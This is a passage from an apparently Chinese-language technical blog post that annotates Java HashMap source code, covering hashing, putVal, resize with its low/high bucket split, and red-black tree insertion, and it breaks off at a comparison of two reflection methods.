<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 00000000 00000000 01001000		// 传入cap为72</span><br><span class="line">00000000 00000000 00000000 01000111		// n=cap-1</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00100011		// n &gt;&gt;&gt; 1</span><br><span class="line">00000000 00000000 00000000 01100111		// n |= n &gt;&gt;&gt; 1，结果：高位出现1的位置与其后一位（至少2位）均变为了1</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00011001		// n &gt;&gt;&gt; 2</span><br><span class="line">00000000 00000000 00000000 01111111		// n |= n &gt;&gt;&gt; 2，结果：高位4位均变为了1</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00000111		// n &gt;&gt;&gt; 4</span><br><span class="line">00000000 00000000 00000000 01111111		// n |= n &gt;&gt;&gt; 4，结果：高位8位均变为了1</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00000000		// n &gt;&gt;&gt; 8</span><br><span class="line">00000000 00000000 00000000 01111111		// n |= n &gt;&gt;&gt; 8，结果：高位16位均变为了1</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00000000		// n &gt;&gt;&gt; 16</span><br><span class="line">00000000 00000000 00000000 01111111		// n |= n &gt;&gt;&gt; 16，结果：高位32位均变为了1（因为Integer最大值为2^31-1，因此最多只会出现31位变成1）</span><br><span class="line"></span><br><span class="line">最后n+1即可得到不小于cap的最小2的整数次方，假如当前cap已经是2的整数次方，通过这一系列的步骤后，得到的n为cap*2，显然不符合要求，故在最初先进行n=cap-1。假如cap为0，则输出的n为-1，故判断n&lt;0，则返回1。要求哈希表长度为2的整数次方，故最大为2^30次方。</span><br></pre></td></tr></table></figure>

<h1 id="4-size"><a href="#4-size" class="headerlink" title="4. size()"></a>4. size()</h1><p>获取键值对的数量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-put-K-key-V-value"><a href="#5-put-K-key-V-value" class="headerlink" title="5. put(K key, V value)"></a>5. put(K key, V value)</h1><p>添加一组键值对。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// 计算key的hash值（详细：5.1），然后添加键值对（详细：5.2）。</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-1-hash-Object-key"><a href="#5-1-hash-Object-key" class="headerlink" title="5.1 hash(Object key)"></a>5.1 hash(Object key)</h2><p>key的hash运算：key为null，则为0；不为null，key的hashCode与hashCode无符号右移16位做异或运算（相同为0，不同为1）。最终结果：高16位不变，低16位变成与高16位做异或运算的结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-2-putVal-int-hash-K-key-V-value-boolean-onlyIfAbsent-boolean-evict"><a href="#5-2-putVal-int-hash-K-key-V-value-boolean-onlyIfAbsent-boolean-evict" class="headerlink" title="5.2 putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict)"></a>5.2 putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict)</h2><p>添加键值对，返回旧值或null。判断key是否完全相同： <code>哈希值相同</code> 且key的 <code>内存地址相同</code> 或 <code>相互equals</code> ，才算同一个key； <code>哈希值相同</code> 但 <code>内存地址不同</code> 且 <code>不相互equals</code> 的情况为哈希冲突。下面用伪代码表示判断过程，在源码中很常见此类的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( (hash == 原hash) &amp;&amp; (key == 原key || (key != null &amp;&amp; key.equals(旧key)) ) )</span><br></pre></td></tr></table></figure>

<p>具体分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数说明：hash：key的hash值；key：键；value：值；</span></span><br><span class="line"><span class="comment">// onlyIfAbsent：true-不存旧值才添加，false-存不存在都添加（如果旧值为null，true或false都会更新）；</span></span><br><span class="line"><span class="comment">// evict：false-创建模式，其他默认true。</span></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">               <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 哈希表为null或长度为0，即未初始化。调用resize()进行初始化，详细：5.3</span></span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">        <span class="comment">// 下标为(n - 1) &amp; hash的数组元素为null，直接创建新节点保存到该位置，newNode方法详细：5.4</span></span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 该数组下标位置已经存在节点</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 新增节点的key与该数组下标元素的首节点key完全相同（两个节点key的hash值相同，且key相等或相互equals，即认为key完全相同）</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="comment">// 保存旧节点到变量e</span></span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 该位置节点为红黑树（=========== 详细：5.5 后续分析1（建议先跳过）===========）</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 该位置节点是单链表结构，但key不与首节点的key相同</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">// 依次遍历链表，若找不到完全相同的key，说明key的hash值相同，但不相等或不相互equals，即出现哈希冲突</span></span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 链表尾部添加新节点</span></span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                    <span class="comment">// binCount为7时，就会树化。分析：binCount为0时，p为第1个节点，binCount为7时，p为第8个节点，新节点添加在p后，</span></span><br><span class="line">                    <span class="comment">// 此时共9个节点，即添加第9个链表节点后，进行树化。（=========== 详细：5.6 后续分析2（建议先跳过）===========）</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// key完全相同，跳出循环，修改e的值</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// e不为null，说明是替换值，而不是新增值</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// 关闭缺少值才保存选项或者旧的值为null，都将替换为新值</span></span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 结构化修改次数+1</span></span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// size+1，再判断若大于阈值，则扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-3-resize"><a href="#5-3-resize" class="headerlink" title="5.3 resize()"></a>5.3 resize()</h2><p>初始化或双倍扩容，返回新容器。需要提前了解如下知识点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.如何确保插入到哪个下标的数组位置上？</span><br><span class="line">hash(key) &amp; (len - 1)为数组的下标</span><br><span class="line"></span><br><span class="line">2.为什么容器大小必须为2的整数次方？</span><br><span class="line">容器大小为2的整数次方前提下，假设当前设置的容器大小为16（二进制为10000），hash(key)为00110</span><br><span class="line">扩容前数组下标为：00110 &amp; 01111 = 00110</span><br><span class="line">扩容后数组下标为：00110 &amp; 11111 = 00110</span><br><span class="line">hash(key) &amp; 旧容器len = 0</span><br><span class="line">元素在新容器的下标 = 元素在旧容器的下标</span><br><span class="line">==============================================================================</span><br><span class="line">容器大小为2的整数次方前提下，假设当前设置的容器大小为16（二进制为10000），hash(key)为10110</span><br><span class="line">扩容前数组下标为：10110 &amp; 01111 = 00110</span><br><span class="line">扩容后数组下标为：10110 &amp; 11111 = 10110</span><br><span class="line">hash(key) &amp; 旧容器len = 10000（也即旧容器长度）</span><br><span class="line">元素在新容器的下标 = 元素在旧容器的下标 + 旧容器长度</span><br><span class="line">结论：resize()在调整同一个数组下标的链表节点在新数组的位置时，正是利用了这个特性，key的哈希值与旧容器的len按位与运算后，结果为0，说明扩容前后元素处在数组的位置不变；结果不为0，说明已经超出了旧容器的长度，在新容器的下标恰好为旧容器下标+旧容器长度。</span><br></pre></td></tr></table></figure>

<p>具体分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 变量含义：oldTab-旧哈希表；oldCap-旧哈希表大小；oldThr-旧阈值，newXxx的类似，这里说的哈希表即Node数组</span></span><br><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">    <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 旧哈希表存在数据，说明是旧容器扩容</span></span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 旧哈希表大小 &gt;= 最大值2^30，把阈值调整到Integer的最大值2^31-1，返回旧哈希表</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 反之，旧哈希表大小、阈值扩容为原来的2倍</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 哈希表不存在数据，且旧阈值 &gt; 0说明实例化容器时，指定了初始化容器的大小（即调用的第2、3点的构造方法），指定新容器大小</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="comment">// 哈希表不存在数据，且旧阈值 = 0说明实例化容器时，调用的是无参构造，使用默认容器大小，并计算新阈值</span></span><br><span class="line">    <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新阈值为0，重新计算阈值。上面指定初始化容器大小的分支并没有计算新阈值</span></span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设定阈值</span></span><br><span class="line">    threshold = newThr;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">    <span class="comment">// 创建新哈希表</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">    <span class="comment">// 设定新哈希表</span></span><br><span class="line">    table = newTab;</span><br><span class="line">    <span class="comment">// 旧哈希表存在数据</span></span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 指向变量e后，数组元素重置为null</span></span><br><span class="line">                oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// 该数组下标只有一个节点数据，直接保存在新哈希表中</span></span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="comment">// 该数组下标的节点为红黑树节点（=========== 详细：5.7 后续分析3（建议先跳过）===========）</span></span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                    <span class="comment">// 该数组下标为不只一个节点数据的单链表，需要了解上面的“提前了解知识点”</span></span><br><span class="line">                    <span class="comment">// 低位的头节点、低位的尾节点。lo为low缩写，即扩容前后数组下标位置不变的节点</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 高位的头节点、高位的尾节点。hi为high缩写，即扩容前后数组下标位置变为：原位置+原数组长度的节点</span></span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="comment">// 记录next节点，结合while中的条件判断遍历链表使用</span></span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="comment">// 说明key的hash值对应旧容器高位1的位置的数字为0，即扩容后下标位置不变</span></span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                <span class="comment">// 第一次遍历，记录头节点</span></span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="comment">// 后续遍历，指定尾节点的next节点</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            <span class="comment">// 尾节点变更为当前节点</span></span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 扩容后，下标变为：原位置+原数组长度，节点绑定与loXxx节点类似</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 当前节点指向next节点，继续下一轮遍历</span></span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 尾节点的next节点置为null</span></span><br><span class="line">                        loTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// 节点在新容器下标不变</span></span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// 节点在新容器下标变为：原位置+原数组长度</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-4-newNode-int-hash-K-key-V-value-Node-next"><a href="#5-4-newNode-int-hash-K-key-V-value-Node-next" class="headerlink" title="5.4 newNode(int hash, K key, V value, Node&lt;K,V&gt; next)"></a>5.4 newNode(int hash, K key, V value, Node&lt;K,V&gt; next)</h2><p>创建并返回新节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Node&lt;K,V&gt; <span class="title function_">newNode</span><span class="params">(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(hash, key, value, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-5-后续分析1"><a href="#5-5-后续分析1" class="headerlink" title="5.5 后续分析1"></a>5.5 后续分析1</h2><p>接着分析5.2中的代码：e &#x3D; ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); 当前数组元素节点为红黑树节点，调用红黑树的putTreeVal方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">putTreeVal</span><span class="params">(HashMap&lt;K,V&gt; map, Node&lt;K,V&gt;[] tab,</span></span><br><span class="line"><span class="params">                               <span class="type">int</span> h, K k, V v)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">searched</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 获取红黑树根节点，详细：5.5.1</span></span><br><span class="line">    TreeNode&lt;K,V&gt; root = (parent != <span class="literal">null</span>) ? root() : <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123;</span><br><span class="line">        <span class="comment">// dir记录方向：小于等于0，遍历左子树；大于0，遍历右子树。ph-节点p的hash值。pk-节点p的key</span></span><br><span class="line">        <span class="type">int</span> dir, ph; K pk;</span><br><span class="line">        <span class="comment">// p的hash值 &gt; k的hash值，记录-1，后续遍历左子树</span></span><br><span class="line">        <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">            dir = -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// p的hash值 &lt; k的hash值，记录1，后续遍历右子树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">            dir = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// hash值相同，key内存地址相同或相互equals，说明：key完全相同，直接返回旧节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (k != <span class="literal">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">// hash值相同，key不相同。comparableClassFor方法详细：5.5.2，compareComparables方法详细：5.5.3</span></span><br><span class="line">        <span class="comment">// 理论可能：1.key没有实现Comparable接口；2.pk为null；3.pk类型不是kc；4.pk类型为kc且k和pk相等。</span></span><br><span class="line">        <span class="comment">// 实际可能：只可能出现1、3，pk不可能为null，null的hash值为0，永远只有一个节点。k和pk若相等已经在上一个if分支返回。</span></span><br><span class="line">        <span class="comment">// 说明：进入此分支的key没有实现Comparable接口或者pk类型与k不同，无法比较。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                  (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                 (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!searched) &#123;</span><br><span class="line">                TreeNode&lt;K,V&gt; q, ch;</span><br><span class="line">                <span class="comment">// 查找过，置为true，后续遍历不再查找</span></span><br><span class="line">                searched = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// 因为无法比较，所以在左右子节点依次查找，直到找到或者找到尽头</span></span><br><span class="line">                <span class="keyword">if</span> (((ch = p.left) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                     <span class="comment">// 查找左、右子节点，里面用了递归，详细：5.5.4</span></span><br><span class="line">                     (q = ch.find(h, k, kc)) != <span class="literal">null</span>) ||</span><br><span class="line">                    ((ch = p.right) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                     (q = ch.find(h, k, kc)) != <span class="literal">null</span>))</span><br><span class="line">                    <span class="keyword">return</span> q;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 仍然没找到对应的节点，若k、pk任一个为null，或两者ClassName相等，比较两者hashCode决定遍历方向。</span></span><br><span class="line">            dir = tieBreakOrder(k, pk);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">        <span class="comment">// dir &lt;= 0获取左子节点，反之获取右子节点，且获取的子节点为null，说明节点没找到，在此插入新节点。</span></span><br><span class="line">        <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 记录p的原next节点，针对链表</span></span><br><span class="line">            Node&lt;K,V&gt; xpn = xp.next;</span><br><span class="line">            <span class="comment">// 创建新的TreeNode节点，并设定next节点为xpn，详细：5.5.5</span></span><br><span class="line">            TreeNode&lt;K,V&gt; x = map.newTreeNode(h, k, v, xpn);</span><br><span class="line">            <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="comment">// 绑定到p节点左边</span></span><br><span class="line">                xp.left = x;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 绑定到p节点右边</span></span><br><span class="line">                xp.right = x;</span><br><span class="line">            <span class="comment">// p节点新的next节点为新节点x</span></span><br><span class="line">            xp.next = x;</span><br><span class="line">            <span class="comment">// 新节点的父节点为p</span></span><br><span class="line">            x.parent = x.prev = xp;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 原next节点不为null，重新绑定其前节点为x</span></span><br><span class="line">            <span class="keyword">if</span> (xpn != <span class="literal">null</span>)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)xpn).prev = x;</span><br><span class="line">            <span class="comment">// 后续步骤：重新平衡红黑树（详细：5.5.6）、调整根节点（详细：5.5.9）</span></span><br><span class="line">            moveRootToFront(tab, balanceInsertion(root, x));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-1-root"><a href="#5-5-1-root" class="headerlink" title="5.5.1 root()"></a>5.5.1 root()</h3><p>获取红黑树根节点，当父节点为null时返回当前节点，即根节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">root</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; r = <span class="built_in">this</span>, p;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((p = r.parent) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-2-comparableClassFor-Object-x"><a href="#5-5-2-comparableClassFor-Object-x" class="headerlink" title="5.5.2 comparableClassFor(Object x)"></a>5.5.2 comparableClassFor(Object x)</h3><p>若x直接实现了Comparable接口，并且指定泛型的参数类型为x.class，则返回x.class，否则返回null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Class&lt;?&gt; comparableClassFor(Object x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        Class&lt;?&gt; c; Type[] ts, as; Type t; ParameterizedType p;</span><br><span class="line">        <span class="comment">// x类型为String.class，直接返回，因为String也是实现了Comparable&lt;String&gt;的</span></span><br><span class="line">        <span class="keyword">if</span> ((c = x.getClass()) == String.class) <span class="comment">// bypass checks</span></span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        <span class="comment">// 获取c的直接实现接口类型（带泛型参数），详细看下图方法</span></span><br><span class="line">        <span class="keyword">if</span> ((ts = c.getGenericInterfaces()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 遍历所有直接实现的接口</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ts.length; ++i) &#123;</span><br><span class="line">                <span class="comment">// 找到Comparable接口上的泛型参数类型，并返回</span></span><br><span class="line">                <span class="keyword">if</span> (((t = ts[i]) <span class="keyword">instanceof</span> ParameterizedType) &amp;&amp;</span><br><span class="line">                    ((p = (ParameterizedType)t).getRawType() ==</span><br><span class="line">                     Comparable.class) &amp;&amp;</span><br><span class="line">                    (as = p.getActualTypeArguments()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                    as.length == <span class="number">1</span> &amp;&amp; as[<span class="number">0</span>] == c) <span class="comment">// type arg is c</span></span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Class类的getInterfaces()与getGenericInterfaces()方法区别：</p>
